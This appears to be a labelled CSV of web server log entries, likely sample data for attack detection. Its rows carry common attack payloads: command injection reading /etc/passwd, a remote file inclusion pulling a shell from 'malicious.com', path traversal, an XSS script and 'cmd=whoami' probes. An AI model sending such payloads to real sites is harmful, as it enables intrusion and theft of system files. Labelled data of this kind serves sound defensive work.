ip,timestamp,request,status,size,attack_type
195.238.229.55,2025-03-15 12:04:55,POST /change-email?email=attacker@example.com HTTP/1.1,200,2655,CSRF_ATTACK
8.200.108.146,2025-03-15 12:04:37,POST /change-email?email=attacker@example.com HTTP/1.1,200,4361,CSRF_ATTACK
53.21.235.1,2025-03-15 12:04:58,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4050,REMOTE_FILE_INCLUSION
213.213.114.150,2025-03-15 12:05:14,POST /wp-json/wp/v2/users HTTP/1.1,200,3604,USER_ENUMERATION
205.241.244.140,2025-03-15 12:05:19,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1907,COMMAND_INJECTION
133.175.106.193,2025-03-15 12:04:47,GET /execute?cmd=whoami HTTP/1.1,403,1750,RCE_ATTACK
53.81.131.187,2025-03-15 12:04:43,GET /api/user?username=admin HTTP/1.1,200,1093,API_ABUSE
222.160.191.47,2025-03-15 12:04:47,GET /execute?cmd=whoami HTTP/1.1,403,736,RCE_ATTACK
214.151.74.198,2025-03-15 12:04:28,POST /change-email?email=attacker@example.com HTTP/1.1,200,3335,CSRF_ATTACK
50.172.77.46,2025-03-15 12:04:57,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1603,XSS_ATTACK
11.14.219.50,2025-03-15 12:04:37,GET /api/user?username=admin HTTP/1.1,200,3489,API_ABUSE
3.192.254.189,2025-03-15 12:04:35,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3317,COMMAND_INJECTION
52.117.92.36,2025-03-15 12:05:00,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2360,COMMAND_INJECTION
111.44.166.155,2025-03-15 12:05:07,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4422,LFI_ATTACK
161.189.224.82,2025-03-15 12:05:04,POST /wp-json/wp/v2/users HTTP/1.1,200,1041,USER_ENUMERATION
247.167.91.30,2025-03-15 12:04:34,GET /etc/passwd HTTP/1.1,200,2258,PATH_TRAVERSAL
223.205.125.63,2025-03-15 12:04:49,GET /etc/passwd HTTP/1.1,200,963,PATH_TRAVERSAL
194.106.240.142,2025-03-15 12:04:50,GET /api/user?username=admin HTTP/1.1,200,2376,API_ABUSE
197.251.16.192,2025-03-15 12:05:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,4107,CSRF_ATTACK
28.29.167.119,2025-03-15 12:04:38,GET /api/user?username=admin HTTP/1.1,200,4728,API_ABUSE
134.162.235.126,2025-03-15 12:05:25,GET /execute?cmd=whoami HTTP/1.1,403,1525,RCE_ATTACK
197.166.114.243,2025-03-15 12:05:02,GET /etc/passwd HTTP/1.1,200,3296,PATH_TRAVERSAL
94.16.160.88,2025-03-15 12:05:08,GET /etc/passwd HTTP/1.1,200,1005,PATH_TRAVERSAL
33.142.19.116,2025-03-15 12:04:46,GET /api/user?username=admin HTTP/1.1,200,2299,API_ABUSE
59.254.216.42,2025-03-15 12:05:01,GET /etc/passwd HTTP/1.1,200,3058,PATH_TRAVERSAL
205.37.86.214,2025-03-15 12:04:42,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2716,LFI_ATTACK
184.205.47.129,2025-03-15 12:04:57,GET /api/user?username=admin HTTP/1.1,200,4560,API_ABUSE
167.163.215.45,2025-03-15 12:05:25,GET /api/user?username=admin HTTP/1.1,200,2768,API_ABUSE
78.149.57.3,2025-03-15 12:04:52,GET /execute?cmd=whoami HTTP/1.1,403,3893,RCE_ATTACK
229.219.22.226,2025-03-15 12:05:15,POST /change-email?email=attacker@example.com HTTP/1.1,200,2031,CSRF_ATTACK
194.167.238.179,2025-03-15 12:04:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3461,XSS_ATTACK
33.81.95.123,2025-03-15 12:04:45,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1534,LFI_ATTACK
132.225.247.96,2025-03-15 12:05:15,GET /api/user?username=admin HTTP/1.1,200,2554,API_ABUSE
